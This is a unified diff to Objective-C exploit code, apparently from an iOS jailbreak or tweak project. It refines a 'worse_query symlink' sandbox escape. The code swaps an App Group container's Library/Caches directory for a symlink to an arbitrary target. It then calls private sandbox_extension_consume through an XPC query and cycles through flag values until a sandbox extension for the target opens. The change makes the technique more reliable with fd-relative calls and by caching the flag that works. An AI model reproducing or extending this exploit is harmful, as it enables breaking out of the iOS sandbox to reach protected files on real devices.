@@ -133,9 +133,10 @@ static const char *kAppGroups[] = {
 };
 static const int kAppGroupCount = 3;
 
-#pragma mark - worse_query symlink: sandbox escape via App Group symlink (forcequitOS technique)
+#pragma mark - worse_query symlink: sandbox escape via App Group symlink (XO/forcequitOS technique)
 
 typedef int64_t (*SBXExtConsumeFunc)(const char *);
+typedef int (*SBXExtReleaseFunc)(int64_t);
 
 static int64_t _worseQuerySymlink(const char *targetPath) {
     @autoreleasepool {
@@ -149,18 +150,21 @@ static int64_t _worseQuerySymlink(const char *targetPath) {
 
         SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                                  "sandbox_extension_consume");
+        SBXExtReleaseFunc releaseExt = (SBXExtReleaseFunc)dlsym(RTLD_DEFAULT,
+                                                                 "sandbox_extension_release");
         if (!consumeExt) {
             NSLog(@"[WQ-SYM] missing sandbox_extension_consume");
             return -2;
         }
 
-        NSOperatingSystemVersion osv = [[NSProcessInfo processInfo] operatingSystemVersion];
         static const uint64_t kFlagSets[] = {
-            0x8000000000ULL,   // iOS 27+ primary
-            0x800000000ULL,    // iOS 26.x / alt
-            0x8100000000ULL,   // read-write variant
+            0x8100000000ULL,
+            0x900000000ULL,
+            0x8000000000ULL,
+            0x800000000ULL,
         };
-        int flagStart = (osv.majorVersion >= 27) ? 0 : 1;
+        static const int kFlagCount = 4;
+        static int sKnownGoodFlag = -1;
 
         NSFileManager *fm = [NSFileManager defaultManager];
 
@@ -172,29 +176,49 @@ static int64_t _worseQuerySymlink(const char *targetPath) {
                 continue;
             }
 
-            NSString *cachesPath = [containerURL.path
-                                    stringByAppendingPathComponent:@"Library/Caches"];
-            const char *cachesC = cachesPath.fileSystemRepresentation;
+            NSString *libraryPath = [containerURL.path
+                                     stringByAppendingPathComponent:@"Library"];
+            int libraryFd = open(libraryPath.fileSystemRepresentation,
+                                 O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+            if (libraryFd < 0) {
+                NSLog(@"[WQ-SYM] cannot open Library fd g[%d] errno=%d", g, errno);
+                continue;
+            }
 
-            for (int fi = flagStart; fi < 3; fi++) {
-                struct stat cst;
-                BOOL hadDir = NO;
-                if (lstat(cachesC, &cst) == 0) {
-                    hadDir = S_ISDIR(cst.st_mode);
-                    if (hadDir)
-                        [fm removeItemAtPath:cachesPath error:nil];
-                    else
-                        unlink(cachesC);
+            for (int oi = 0; oi < kFlagCount; oi++) {
+                int fi;
+                if (sKnownGoodFlag >= 0) {
+                    if (oi == 0) fi = sKnownGoodFlag;
+                    else if (oi <= sKnownGoodFlag) fi = oi - 1;
+                    else fi = oi;
+                } else {
+                    fi = oi;
                 }
 
-                if (symlink(targetPath, cachesC) != 0) {
-                    NSLog(@"[WQ-SYM] symlink %s → %s errno=%d", cachesC, targetPath, errno);
-                    mkdir(cachesC, 0755);
+                struct stat cst;
+                if (fstatat(libraryFd, "Caches", &cst, AT_SYMLINK_NOFOLLOW) == 0) {
+                    if (S_ISDIR(cst.st_mode)) {
+                        NSString *cachesPath = [libraryPath
+                            stringByAppendingPathComponent:@"Caches"];
+                        [fm removeItemAtPath:cachesPath error:nil];
+                    } else {
+                        unlinkat(libraryFd, "Caches", 0);
+                    }
+                }
+
+                if (symlinkat(targetPath, libraryFd, "Caches") != 0) {
+                    NSLog(@"[WQ-SYM] symlinkat g[%d] f=%d errno=%d target=%s",
+                          g, fi, errno, targetPath);
+                    mkdirat(libraryFd, "Caches", 0755);
                     continue;
                 }
 
                 void *q = api->queryCreate();
-                if (!q) { unlink(cachesC); mkdir(cachesC, 0755); continue; }
+                if (!q) {
+                    unlinkat(libraryFd, "Caches", 0);
+                    mkdirat(libraryFd, "Caches", 0755);
+                    continue;
+                }
 
                 api->querySetClass(q, 7);
                 xpc_object_t xid = xpc_string_create(kAppGroups[g]);
@@ -222,8 +246,8 @@ static int64_t _worseQuerySymlink(const char *targetPath) {
                           g, fi, posix, targetPath);
                 }
 
-                unlink(cachesC);
-                mkdir(cachesC, 0755);
+                unlinkat(libraryFd, "Caches", 0);
+                mkdirat(libraryFd, "Caches", 0755);
                 xpc_release(xid);
                 api->queryFree(q);
 
@@ -231,14 +255,19 @@ static int64_t _worseQuerySymlink(const char *targetPath) {
                     int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
                     if (fd >= 0) {
                         close(fd);
+                        sKnownGoodFlag = fi;
                         DavizinMCMLog([NSString stringWithFormat:
                             @"[WQ-SYM] *** SUCCESS g[%d] f=%d → %s ***", g, fi, targetPath]);
+                        close(libraryFd);
                         return handle;
                     }
                     NSLog(@"[WQ-SYM] g[%d] f=%d handle=%lld but open errno=%d %s",
                           g, fi, (long long)handle, errno, targetPath);
+                    if (releaseExt) releaseExt(handle);
                 }
             }
+
+            close(libraryFd);
         }
 
         return -1;
